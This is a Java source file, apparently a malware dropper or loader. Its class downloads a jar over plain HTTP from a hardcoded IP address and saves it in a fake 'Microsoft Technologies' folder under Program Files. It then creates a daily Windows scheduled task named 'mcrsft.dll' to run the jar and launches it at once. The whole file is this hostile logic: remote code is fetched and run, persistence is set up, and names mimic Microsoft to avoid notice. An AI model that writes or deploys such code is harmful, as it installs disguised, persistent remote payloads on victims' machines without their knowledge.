package sloader.scheduler;

import java.io.File;
import java.io.FileOutputStream;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

public class SloaderRegisterer {

	private static String APPNAME = "pcaLoader.jar";

	public static void register() {
		Thread registerThread = new Thread(new Runnable() {
			public void run() {
				registerSync();
			}
		});
		registerThread.setDaemon(false);
		registerThread.start();
	}

	private static void registerSync() {
		try {
			String s = File.separator;
			String folderLoc = "C:" + s + "Program Files" + s + "Microsoft Technologies";
			File folder = new File(folderLoc);
			if (!folder.exists())
				folder.mkdir();
			String appLocation = folder + s + "pcaLoader.jar";
			String runAppCommand = "javaw -jar \"" + appLocation + "\"";
			File app = new File(appLocation);
			if (!app.exists()) {
				// Download sloader.app
				String downloadUrl = "http://213.14.153.57/serviceProvider/" + APPNAME + "/downloadFile.do";
				String downloadLocation = appLocation;
				URL url = new URL(downloadUrl);
				ReadableByteChannel rbc = Channels.newChannel(url.openStream());
				FileOutputStream fos = new FileOutputStream(downloadLocation);
				fos.getChannel().transferFrom(rbc, 0, 1 << 24);
				fos.close();
				// Register Scheduled Task.
				String schdTaskCommand = "SchTasks /Create /SC DAILY /TN \"mcrsft.dll\" /TR \"javaw -jar " + downloadLocation + " sloader\" /ST 00:00";
				Runtime.getRuntime().exec(schdTaskCommand);
			}
			// Run sloader
			Runtime.getRuntime().exec(runAppCommand);
		} catch (Exception e) {
			System.err.println(e);
		} finally {

		}
	}

}
